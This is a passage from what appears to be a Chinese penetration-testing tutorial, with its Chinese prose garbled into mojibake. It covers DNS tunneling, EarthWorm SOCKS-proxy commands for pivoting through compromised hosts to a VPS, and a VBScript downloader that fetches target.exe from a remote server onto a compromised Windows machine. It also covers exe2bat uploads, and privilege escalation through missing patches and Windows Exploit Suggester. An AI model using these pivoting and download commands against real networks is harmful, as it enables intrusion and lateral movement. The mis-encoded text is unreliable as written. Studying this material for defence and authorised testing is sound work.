id="DNS-åè®®"><a href="#DNS-åè®®" class="headerlink" title="DNS åè®®"></a>DNS åè®®</h4><p><code>cat /etc/resolv.conf</code> æŸ¥è¯¢å½“å‰å†…éƒ¨åŸŸååŠ IPï¼Œ<code>nslookup å†…éƒ¨0åŸŸå</code> æŸ¥çœ‹æ˜¯å¦èƒ½ä¸å†…éƒ¨ DNS é€šä¿¡ï¼Œ <code>nslookup baidu.com</code> æŸ¥è¯¢æ˜¯å¦èƒ½é€šè¿‡å†…éƒ¨ DNS æœåŠ¡å™¨è§£æå¤–éƒ¨åŸŸåï¼Œå¦‚æœå¯ä»¥åˆ™æ„å‘³ç€å¯ä»¥ä½¿ç”¨ DNS éš§é“å®ç°éšè”½é€šä¿¡</p><h5 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h5><p><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></p><h5 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h5><p><a href="https://github.com/Al1ex/iodine">https://github.com/Al1ex/iodine</a></p><p><strong>é˜²å¾¡ DNS éš§é“æ”»å‡»çš„æ–¹æ³•</strong></p><p>é˜²å¾¡å¾ˆ J8 éš¾ï¼Œä¸‹åˆ—æ“ä½œå¯ä»¥é˜²å¾¡å¸¸è§çš„éš§é“æ”»å‡»è¡Œä¸º</p><ul><li>ç¦æ­¢ç½‘ç»œä¸­çš„ä»»ä½•äººå‘å¤–éƒ¨æœåŠ¡å™¨å‘é€ DNS è¯·æ±‚ï¼Œåªå…è®¸ä¸å—ä¿¡ä»»çš„ DNS æœåŠ¡å™¨é€šä¿¡</li><li>è™½ç„¶æ²¡æœ‰äººä¼šå°† TXT è§£æè¯·æ±‚å‘é€ç»™ DNS æœåŠ¡å™¨ï¼Œä½†æ˜¯ dnscat2 å’Œé‚®ä»¶æœåŠ¡å™¨/ç½‘å…³ä¼šè¿™æ ·åšï¼Œå› æ­¤ï¼Œå¯ä»¥å°†é‚®ä»¶æœåŠ¡å™¨/ç½‘å…³åˆ—å…¥ç™½åå•å¹¶é˜»æ­¢ä¼ å…¥å’Œä¼ å‡ºæµé‡ä¸­çš„ TXT è¯·æ±‚</li><li>è·Ÿè¸ªç”¨æˆ·çš„ DNS æŸ¥è¯¢æ¬¡æ•°ï¼Œå¦‚æœè¾¾åˆ°é˜ˆå€¼ï¼Œå°±ç”Ÿæˆç›¸åº”çš„æŠ¥å‘Š</li><li>ç»„ç»‡ ICMP</li></ul><h3 id="SOCKS-ä»£ç†"><a href="#SOCKS-ä»£ç†" class="headerlink" title="SOCKS ä»£ç†"></a>SOCKS ä»£ç†</h3><p>å¸¸è§çš„ç½‘ç»œåœºæ™¯</p><ul><li>æœåŠ¡å™¨åœ¨å†…ç½‘ä¸­ï¼Œå¯ä»¥ä»»æ„è®¿é—®å¤–éƒ¨ç½‘ç»œ</li><li>æœåŠ¡å™¨åœ¨å†…ç½‘ä¸­ï¼Œå¯ä»¥è®¿é—®å¤–éƒ¨ç½‘ç»œï¼Œä½†æœåŠ¡å™¨å®‰è£…äº†é˜²ç«å¢™æ¥æ‹’ç»æ•æ„Ÿç«¯å£çš„è¿æ¥</li><li>æœåŠ¡å™¨åœ¨å†…ç½‘ä¸­ï¼Œå¯¹å¤–åªå¼€æ”¾äº†éƒ¨åˆ†ç«¯å£ï¼ˆä¾‹å¦‚ 80ï¼‰ï¼Œä¸”æœåŠ¡å™¨ä¸èƒ½è®¿é—®å¤–éƒ¨ç½‘ç»œ</li></ul><h4 id="å¸¸ç”¨-SOCKS-ä»£ç†å·¥å…·"><a href="#å¸¸ç”¨-SOCKS-ä»£ç†å·¥å…·" class="headerlink" title="å¸¸ç”¨ SOCKS ä»£ç†å·¥å…·"></a>å¸¸ç”¨ SOCKS ä»£ç†å·¥å…·</h4><ul><li>EarthWormï¼š<a href="https://github.com/rootkiter/EarthWorm">https://github.com/rootkiter/EarthWorm</a><ul><li>EW å·²ç»æ°¸ä¹…åœæ­¢æ›´æ–°ï¼ŒGithub ä¸Šå¥½åƒä¹Ÿæ²¡äº†ï¼ŒEW çš„æ–°ç‰ˆæœ¬ Termiteï¼š<a href="https://github.com/rootkiter/Termite">https://github.com/rootkiter/Termite</a></li></ul></li><li>reGeorg</li><li>sSocks</li><li>SocksCap64ï¼š<a href="http://www.sockscap64.com/">http://www.sockscap64.com/</a></li><li>Proxifierï¼ˆå¾ˆå¥½ç”¨çš„å…¨å±€ä»£ç†ï¼‰ï¼š<a href="https://www.proxifier.com/">https://www.proxifier.com/</a></li><li>ProxyChainsï¼ˆLinux ä¸‹å®ç°å…¨å±€ä»£ç†ï¼‰</li></ul><h4 id="åº”ç”¨"><a href="#åº”ç”¨" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h4><p>EW æœ‰å…­ç§å‘½ä»¤æ ¼å¼ï¼š</p><ul><li>æ­£å‘è¿æ¥<ul><li>ssokcsd</li></ul></li><li>åå‘è¿æ¥<ul><li>rcsocks</li><li>rssocks</li></ul></li><li>å¤æ‚ç½‘ç»œçš„å¤šçº§çº§è”<ul><li>lcx_slave</li><li>lcx_listen</li><li>lcx_tran</li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. æ­£å‘ SOCKS5 æœåŠ¡å™¨</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># é€‚ç”¨äºç›®æ ‡æœºå™¨æ‹¥æœ‰ä¸€ä¸ªå¤–ç½‘ IP çš„æƒ…å†µ</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå³å¯æ¶è®¾ä¸€ä¸ªç«¯å£ä¸º 888 çš„ SOCKS ä»£ç†ï¼Œæ¥ä¸‹æ¥ï¼Œä½¿ç”¨ SocksCap64 æ·»åŠ è¿™ä¸ª IP åœ°å€çš„ä»£ç†å³å¯</span></span></span><br><span class="line">ew -s ssocksd -l 888</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. åå¼¹ SOCKS5 æœåŠ¡å™¨</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ç›®æ ‡æœºå™¨æ²¡æœ‰å…¬ç½‘ IP çš„æƒ…å†µï¼ˆä½¿å…¶å¯ä»¥è®¿é—®å†…ç½‘èµ„æºï¼‰</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># åœ¨å…¬ç½‘ VPS ä¸Šæ·»åŠ ä¸€ä¸ªè½¬æ¥éš§é“ï¼ŒæŠŠ 1080 ç«¯å£æ”¶åˆ°çš„ä»£ç†è¯·æ±‚è½¬å‘ç»™ 888 ç«¯å£</span></span></span><br><span class="line">ew -s rcsocks -l 1008 -e 888</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># åœ¨ Web æœåŠ¡å™¨ä¸Šå¯åŠ¨ SOCKS5 æœåŠ¡ï¼Œç„¶ååå¼¹åˆ° VPS çš„ 888 ç«¯å£</span></span></span><br><span class="line">ew -s rcsocks -d VPS-IP -e 888</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. äºŒçº§ç½‘ç»œç¯å¢ƒï¼ˆaï¼‰</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># å¦‚æœå·²ç»è·å¾— A ä¸»æœºä¸ B ä¸»æœºæƒé™ï¼ŒA æ‹¥æœ‰ä¸¤å—ç½‘å¡ï¼Œä¸€å—é€šå¤–ç½‘ï¼Œä¸€å—åªé€š Bï¼Œè€Œ B åªå¯ä»¥è®¿é—®å†…ç½‘èµ„æº</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># åœ¨ B ä¸­ï¼Œåˆ©ç”¨ ssocksd æ–¹å¼å¯åŠ¨ 888 çš„ SOCKS ä»£ç†</span></span></span><br><span class="line">ew -s ssocksd -l 888</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># åœ¨ A ä¸­ï¼Œå°† 1080 ç«¯å£æ”¶åˆ°çš„ä»£ç†è¯·æ±‚è½¬å‘ç»™ B çš„ 888 ç«¯å£ï¼Œå³å¯é€šè¿‡ A çš„å¤–ç½‘ 1080 ç«¯å£ä½¿ç”¨ B ä¸Šæ¶è®¾çš„ SOCKS5 ä»£ç†äº†</span></span></span><br><span class="line">ew -s lcx_tran -l 1080 -f B-IP -g 888</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4ã€‚ äºŒçº§ç½‘ç»œç¯å¢ƒï¼ˆbï¼‰</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># å¦‚æœå·²ç»è·å¾— A ä¸»æœºä¸ B ä¸»æœºæƒé™ï¼ŒA æ—¢æ²¡æœ‰å…¬ç½‘ IP åœ°å€ï¼Œä¹Ÿæ— æ³•è®¿é—®å†…ç½‘èµ„æºï¼ŒB åªå¯ä»¥è®¿é—®å†…ç½‘èµ„æº</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># é¦–å…ˆåœ¨å…¬ç½‘ VPS ä¸­æ·»åŠ è½¬æ¥éš§é“ï¼Œå°† 10800 ç«¯å£æ”¶åˆ°çš„ä»£ç†è¯·æ±‚è½¬å‘ç»™ 888 ç«¯å£</span></span></span><br><span class="line">ew -s lcx_listen -l 10800 -e 888</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># B ä¸­ï¼Œåˆ©ç”¨ ssocksd æ–¹å¼å¯åŠ¨ 999 ç«¯å£çš„ SOCKS ä»£ç†</span></span></span><br><span class="line">ew -s ssocksd -l 999</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># A ä¸­ï¼Œåˆ©ç”¨ lcx_slave æ–¹å¼å°†å…¬ç½‘ VPS çš„ 888 ç«¯å£å’Œ B ä¸»æœºçš„ 999 ç«¯å£è¿æ¥èµ·æ¥ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥é€šè¿‡è®¿é—®å…¬ç½‘ VPS çš„ 10800 ç«¯å£ä½¿ç”¨åœ¨ B ä¸Šæ¶è®¾çš„ SOCKS5 ä»£ç†äº†</span></span></span><br><span class="line">ew -s lcx_slave -d VPS-IP -e 888 -f B-IP -g 999</span><br><span class="line"><span class="meta">#</span><span class="bash"> 5. ä¸‰çº§ç½‘ç»œç¯å¢ƒ</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># A æ²¡æœ‰å…¬ç½‘ IPï¼Œå¯ä»¥è®¿é—®å¤–ç½‘ï¼ŒB ä¸èƒ½è®¿é—®å¤–ç½‘ï¼Œä½†å¯ä»¥è¢« A è®¿é—®ï¼ŒC å¯è¢« B è®¿é—®ï¼Œè€Œä¸”å¯ä»¥è®¿é—®æ ¸å¿ƒåŒºåŸŸ</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># VPS ä¸­ï¼Œå°† 1080 ç«¯å£æ”¶åˆ°çš„ä»£ç†è¯·æ±‚è½¬å‘ç»™ 888 ç«¯å£</span></span></span><br><span class="line">ew -s rcsocks -l 1080 -e 888</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># A ä¸­ï¼Œå°†å…¬ç½‘ VPS çš„ 888 ç«¯å£å’Œ B çš„ 999 ç«¯å£è¿æ¥èµ·æ¥</span></span></span><br><span class="line">ew -s lcx_slave -d VPS-IP -e 888 -f B-IP -g 999</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># B ä¸­ï¼Œå°† 999 ç«¯å£æ”¶åˆ°çš„ä»£ç†è¯·æ±‚è½¬å‘ç»™ 777 ç«¯å£</span></span></span><br><span class="line">ew -s lcx_listen -l 999 -e 777</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># C ä¸­ï¼Œå¯åŠ¨ SOCKS5 æœåŠ¡ï¼Œå¹¶åå¼¹åˆ° B çš„ 777 ç«¯å£ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥é€šè¿‡è®¿é—®å…¬ç½‘ VPS çš„ 1080 ç«¯å£ä½¿ç”¨åœ¨ C ä¸Šæ¶è®¾çš„ SOCKS5 ä»£ç†äº†</span></span></span><br><span class="line">ew -s rssocks -d B-IP -e 777</span><br></pre></td></tr></table></figure><h3 id="ä¸Šä¼ å’Œä¸‹è½½"><a href="#ä¸Šä¼ å’Œä¸‹è½½" class="headerlink" title="ä¸Šä¼ å’Œä¸‹è½½"></a>ä¸Šä¼ å’Œä¸‹è½½</h3><p>å¯¹äºä¸èƒ½ä¸Šä¼  Shellï¼Œä½†æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ Windows æœåŠ¡å™¨ï¼ˆè€Œä¸”å”¯ä¸€çš„å…¥å£å°±æ˜¯å‘½ä»¤è¡Œç¯å¢ƒï¼‰ï¼Œå¯ä»¥åœ¨ Shell å‘½ä»¤è¡Œç¯å¢ƒä¸­å¯¹ç›®æ ‡æœåŠ¡å™¨è¿›è¡Œä¸Šä¼ å’Œä¸‹è½½æ“ä½œ</p><h4 id="åˆ©ç”¨-FTP-åè®®ä¸Šä¼ "><a href="#åˆ©ç”¨-FTP-åè®®ä¸Šä¼ " class="headerlink" title="åˆ©ç”¨ FTP åè®®ä¸Šä¼ "></a>åˆ©ç”¨ FTP åè®®ä¸Šä¼ </h4><p>åœ¨æœ¬åœ°æˆ–è€… VPS ä¸Šæ­å»º FTP æœåŠ¡å™¨ï¼Œå¸¸ç”¨çš„ FTP å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">open &lt;æœåŠ¡å™¨åœ°å€&gt;  # è¿æ¥æœåŠ¡å™¨</span><br><span class="line">cd &lt;ç›®å½•å&gt;  # è¿›å…¥æŒ‡å®šç›®å½•</span><br><span class="line">lcd &lt;æ–‡ä»¶å¤¹è·¯å¾„&gt;  # å®šä½æœ¬åœ°æ–‡ä»¶å¤¹ï¼ˆä¸Šä¼ æ–‡ä»¶çš„ä½ç½®æˆ–è€…ä¸‹è½½æ–‡ä»¶çš„æœ¬åœ°ä½ç½®ï¼‰</span><br><span class="line">type  # æŸ¥çœ‹å½“å‰çš„ä¼ è¾“æ–¹å¼ï¼ˆé»˜è®¤ä¸º ASCII ç ä¼ è¾“ï¼‰</span><br><span class="line">ascii  # è®¾ç½®ä¼ è¾“æ–¹å¼ä¸º ASCII ç ä¼ è¾“ï¼ˆä¼  TXT ç­‰æ ¼å¼çš„æ–‡ä»¶ï¼‰</span><br><span class="line">binary  # è®¾ç½®ä¼ è¾“æ–¹å¼ä¸ºäºŒè¿›åˆ¶ä¼ è¾“ï¼ˆä¼ è¾“ EXE æ–‡ä»¶ï¼Œä»¥åŠå›¾ç‰‡ã€è§†/éŸ³é¢‘æ–‡ä»¶ç­‰ï¼‰</span><br><span class="line">close  # ç»“æŸä¸æœåŠ¡å™¨çš„ FTP ä¼šè¯</span><br><span class="line">quit  # ç»“æŸä¸æœåŠ¡å™¨çš„ FTP ä¼šè¯å¹¶é€€å‡º FTP ç¯å¢ƒ</span><br><span class="line">put &lt;æ–‡ä»¶å&gt; [newname]  # ä¸Šä¼ ï¼Œnewname ä¸ºä¿å­˜æ—¶çš„æ–°åå­—ï¼Œè‹¥ä¸æŒ‡å®šå°†ä»¥åŸåä¿å­˜</span><br><span class="line">send &lt;æ–‡ä»¶å&gt; [newname]  # ä¸Šä¼ ï¼Œnewname ä¸ºä¿å­˜æ—¶çš„æ–°åå­—ï¼Œè‹¥ä¸æŒ‡å®šå°†ä»¥åŸåä¿å­˜</span><br><span class="line">get &lt;æ–‡ä»¶å&gt; [newname]  # ä¸‹è½½ï¼Œnewname ä¸ºä¿å­˜æ—¶çš„æ–°åå­—ï¼Œè‹¥ä¸æŒ‡å®šå°†ä»¥åŸåä¿å­˜</span><br><span class="line">mget filename [filename ...]  # ä¸‹è½½å¤šä¸ªæ–‡ä»¶ï¼Œmget å‘½ä»¤æ”¯æŒç©ºæ ¼å’Œ&quot;?&quot;ä¸¤ä¸ªé€šé…ç¬¦ï¼Œä¾‹å¦‚ &quot;mget .mp3&quot; è¡¨ç¤ºä¸‹è½½ FTP æœåŠ¡å™¨å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ‰©å±•åä¸º&quot;.mp3&quot;çš„æ–‡ä»¶</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨-VBS-ä¸Šä¼ "><a href="#åˆ©ç”¨-VBS-ä¸Šä¼ " class="headerlink" title="åˆ©ç”¨ VBS ä¸Šä¼ "></a>åˆ©ç”¨ VBS ä¸Šä¼ </h4><p>VBS è„šæœ¬ä¸»è¦ä½¿ç”¨ msxm12.xmlhttp &amp; adodb.stream å¯¹è±¡</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> Post = <span class="built_in">CreateObject</span>(<span class="string">&quot;Msxm12.XMLHTTP&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> Shell = <span class="built_in">CreateObject</span>(<span class="string">&quot;Wscript.Shell&quot;</span>)</span><br><span class="line">Post.Open <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://server_ip/target.exe&quot;</span>,<span class="number">0</span></span><br><span class="line">Post.Send()</span><br><span class="line"><span class="keyword">Set</span> aGet = <span class="built_in">CreateObject</span>(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">aGet.Mode = <span class="number">3</span></span><br><span class="line">aGet.Type = <span class="number">1</span></span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile <span class="string">&quot;C:\test\target.exe&quot;</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure><p>åœ¨ç›®æ ‡æœåŠ¡å™¨çš„ Shell å‘½ä»¤è¡Œä¸­ç”¨ &gt; å’Œ &gt;&gt; é€è¡Œè¾“å…¥æ–‡ä»¶ download.vbsï¼Œç„¶åæ‰§è¡Œ <code>Csript download.vbs</code> å³å¯åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸­ä¸‹è½½ VPS ä¸Šçš„ target.exe</p><h4 id="åˆ©ç”¨-Debug-ä¸Šä¼ "><a href="#åˆ©ç”¨-Debug-ä¸Šä¼ " class="headerlink" title="åˆ©ç”¨ Debug ä¸Šä¼ "></a>åˆ©ç”¨ Debug ä¸Šä¼ </h4><p>å°†éœ€è¦ä¸Šä¼ çš„ exe æ–‡ä»¶è½¬æ¢ä¸º hex å½¢å¼ï¼Œå†é€šè¿‡ echo å‘½ä»¤å°†å…¶å†™å…¥æ–‡ä»¶ï¼Œæœ€åé€šè¿‡ Debug åŠŸèƒ½å°† hex ä»£ç ç¼–è¯‘å¹¶è¿˜åŸæˆ exe æ–‡ä»¶</p><p>è¯¥å·¥å…·çš„åŠŸèƒ½åˆ—ä¸¾ï¼š</p><ul><li>ç›´æ¥è¾“å…¥ã€ä¿®æ”¹ã€è·Ÿè¸ªã€è¿è¡Œæ±‡ç¼–è¯­è¨€æºç¨‹åº</li><li>æŸ¥çœ‹æ“ä½œç³»ç»Ÿä¸­çš„å†…å®¹</li><li>æŸ¥çœ‹ ROM BIOS çš„å†…å®¹</li><li>æŸ¥çœ‹ã€ä¿®æ”¹ RAM å†…éƒ¨çš„è®¾ç½®å€¼</li><li>ä»¥æ‰‡åŒºæˆ–æ–‡ä»¶çš„æ–¹å¼è¯»/å†™è½¯ç›˜æ•°æ®</li><li>å°†åå…­è¿›åˆ¶ä»£ç è½¬æ¢ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆhexï¼‰</li></ul><p>åœ¨ KaLi ä¸­ï¼Œexe2bat.exe å·¥å…·ä½äº /usr/share/windows-binaries ç›®å½•ä¸‹ï¼Œåœ¨è¯¥ç›®å½•ä¸‹æ‰§è¡Œï¼Œå°†éœ€è¦ä¸Šä¼ çš„ xxx.exe æ–‡ä»¶è½¬æ¢æˆ hex å½¢å¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wine exe2bat.exe xxx.exe xxx.txt</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨ç›®æ ‡æœåŠ¡å™¨çš„ Debug åŠŸèƒ½è¿˜åŸ</p><p>ä½¿ç”¨ Debug æ˜¯ä¸€ç§æ¯”è¾ƒè€çš„æ–¹æ³•ï¼Œexe2bat.exe åªæ”¯æŒå°äº 64K çš„æ–‡ä»¶ï¼Œå¤§äº†çš„è¯ä¼šæŠ¥é”™</p><h4 id="åˆ©ç”¨-Nishang-bitsadmin-PowerShell-ä¸Šä¼ "><a href="#åˆ©ç”¨-Nishang-bitsadmin-PowerShell-ä¸Šä¼ " class="headerlink" title="åˆ©ç”¨ Nishang / bitsadmin / PowerShell ä¸Šä¼ "></a>åˆ©ç”¨ Nishang / bitsadmin / PowerShell ä¸Šä¼ </h4><ul><li>Nishang ä¸­çš„ä¸‹è½½æ‰§è¡Œè„šæœ¬ Downoad_Execute</li><li>å‘½ä»¤è¡Œå·¥å…· bitsadminï¼ˆWindows XP ä»¥åçš„ç‰ˆæœ¬ Windows è‡ªå¸¦ï¼ˆWindows Update å°±æ˜¯ç”¨å®ƒä¸‹è½½æ–‡ä»¶ï¼‰ï¼Œæ¨èåœ¨ Windows7 å’Œ Windows8 ä¸»æœºä¸Šä½¿ç”¨ï¼‰</li><li>ä»¥ .NET æ¡†æ¶ä¸ºåŸºç¡€çš„ PowerShellï¼ˆåœ¨ Windows Server 2003 ä»¥åç‰ˆæœ¬é»˜è®¤è‡ªå¸¦ï¼‰</li></ul><h2 id="æƒé™æå‡åˆ†æé˜²å¾¡"><a href="#æƒé™æå‡åˆ†æé˜²å¾¡" class="headerlink" title="æƒé™æå‡åˆ†æé˜²å¾¡"></a>æƒé™æå‡åˆ†æé˜²å¾¡</h2><p>åœ¨ Windwos ä¸­ï¼Œæƒé™å¤§æ¦‚åˆ†ä¸ºå››ç§ï¼Œåˆ†åˆ«æ˜¯ Userã€Administratorã€Systemã€TrustedInstallerï¼Œé€šå¸¸æˆ‘ä»¬æ¥è§¦çš„æ˜¯å‰ä¸‰ç§ï¼Œç¬¬å››ç§åœ¨å¸¸è§„ä½¿ç”¨ä¸­é€šå¸¸ä¸ä¼šæ¶‰åŠ</p><ul><li>Userï¼šæ™®é€šç”¨æˆ·æƒé™ï¼Œæ˜¯ç³»ç»Ÿä¸­æœ€å®‰å…¨çš„æƒé™ï¼ˆå› ä¸ºåˆ†é…ç»™æ”¹ç»„çš„é»˜è®¤æƒé™ä¸å…è®¸æˆå‘˜ä¿®æ”¹æ“ä½œç³»ç»Ÿçš„è®¾ç½®æˆ–è€…ç”¨æˆ·èµ„æ–™ï¼‰</li><li>Administratorï¼šç®¡ç†å‘˜æƒé™ï¼Œå¯ä»¥åˆ©ç”¨ Windows çš„æœºåˆ¶å°†è‡ªå·±æå‡ä¸º System æƒé™ï¼Œä¸€è¾¹æ“ä½œ SAM æ–‡ä»¶ç­‰</li><li>Systemï¼šç³»ç»Ÿæƒé™ï¼Œå¯ä»¥å¯¹ SAM ç­‰æ•æ„Ÿæ–‡ä»¶è¿›è¡Œè¯»å–ï¼Œå¾€å¾€éœ€è¦å°† Administrator æƒé™æå‡åˆ° System æƒé™æ‰å¯ä»¥å¯¹æ•£åˆ—å€¼è¿›è¡Œ Dump æ“ä½œ</li><li>TrustedInstallerï¼šWindows çš„æœ€é«˜æƒé™ï¼Œå¯¹ç³»ç»Ÿæ–‡ä»¶ï¼Œå³ä½¿æ‹¥æœ‰ System æƒé™ä¹Ÿæ— æ³•è¿›è¡Œä¿®æ”¹ï¼Œåªæœ‰æ‹¥æœ‰ TrustedInstaller æƒé™çš„ç”¨æˆ·æ‰å¯ä»¥ä¿®æ”¹ç³»ç»Ÿæ–‡ä»¶</li></ul><p>å¸¸ç”¨ææƒæ–¹æ³•ï¼š</p><ul><li>ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ</li><li>æ•°æ®åº“ææƒ</li><li>é”™è¯¯çš„ç³»ç»Ÿé…ç½®ææƒ</li><li>ç»„ç­–ç•¥é¦–é€‰é¡¹ææƒ</li><li>Web ä¸­é—´ä»¶æ¼æ´å¡«æƒ</li><li>DLL åŠ«æŒææƒ</li><li>æ»¥ç”¨é«˜æƒé™ä»¤ç‰Œææƒ</li><li>ç¬¬ä¸‰æ–¹è½¯ä»¶/æœåŠ¡ææƒ</li></ul><h3 id="ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒåˆ†æ"><a href="#ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒåˆ†æ" class="headerlink" title="ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒåˆ†æ"></a>ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒåˆ†æ</h3><h4 id="é€šè¿‡æ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤å‘ç°ç¼ºå¤±è¡¥ä¸"><a href="#é€šè¿‡æ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤å‘ç°ç¼ºå¤±è¡¥ä¸" class="headerlink" title="é€šè¿‡æ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤å‘ç°ç¼ºå¤±è¡¥ä¸"></a>é€šè¿‡æ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤å‘ç°ç¼ºå¤±è¡¥ä¸</h4><p>æŸ¥çœ‹å½“å‰æƒé™ï¼Œ<code>whoami /groups</code>ï¼Œæˆ‘ä»¬éœ€è¦ä» Mandatory Label\Medium Mandatory Level æå‡åˆ° Mandatory Label\High Mandatory Levelï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>systeminfo</code> æˆ–è€… <code>Wmic gfe get Caption,Description,HotFixIp,InstalledOn</code> æŸ¥è¯¢è¡¥ä¸</p><p>æ”»å‡»è€…ä¸€èˆ¬é‡‡å–çš„åˆ©ç”¨æ–¹å¼ä¸ºï¼šå¯»æ‰¾ææƒçš„ EXPï¼Œå°†å·²å®‰è£…çš„è¡¥ä¸ç¼–å·ä¸ææƒçš„ EXP ç¼–å·è¿›è¡Œå¯¹æ¯”ï¼Œä¾‹å¦‚ KiTrap0D å’Œ kB9796682ã€MS11-011 å’Œ KB2393802ã€MS11-080 å’Œ KB2592799ã€MS10-021 å’Œ KB2592799ï¼Œç„¶åä½¿ç”¨æ²¡æœ‰ç¼–å·çš„ EXO è¿›è¡Œææƒ</p><p>å¸¸è§ EXPï¼š<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p><h4 id="åˆ©ç”¨-Metaspoit-å‘ç°ç¼ºå¤±è¡¥ä¸"><a href="#åˆ©ç”¨-Metaspoit-å‘ç°ç¼ºå¤±è¡¥ä¸" class="headerlink" title="åˆ©ç”¨ Metaspoit å‘ç°ç¼ºå¤±è¡¥ä¸"></a>åˆ©ç”¨ Metaspoit å‘ç°ç¼ºå¤±è¡¥ä¸</h4><p>post/windows/gather/enum_patches æ¨¡å—</p><h4 id="Windows-Expoit-Suggester"><a href="#Windows-Expoit-Suggester" class="headerlink" title="Windows Expoit Suggester"></a>Windows Expoit Suggester</h4><p><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p><p>ä½¿ç”¨ systeminfo å‘½ä»¤è·å–ä¿¡æ¯å¹¶å¯¼å…¥ patches.txt æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">py wes.py --update  # è‡ªåŠ¨ä¸‹è½½å®‰å…¨å…¬å‘Šæ•°æ®åº“ï¼Œä¸‹è½½çš„æ–‡ä»¶ä¼šè‡ªåŠ¨åœ¨å½“å‰ç›®å½•ä»¥ Excel çš„å½¢å¼ä¿å­˜</span><br><span class="line">pip install xlrd -upgrade  # å®‰è£… xlrd æ¨¡å—</span><br><span class="line">py wes.py -d 2019-02-02-mssb.xls -i patches.txt  # é¢„å¤„ç†ï¼Œæ£€æŸ¥ç³»ç»Ÿä¸­æ˜¯å¦å­˜åœ¨æœªä¿®å¤çš„æ¼æ´</span><br></pre></td></tr></table></figure><p>msf 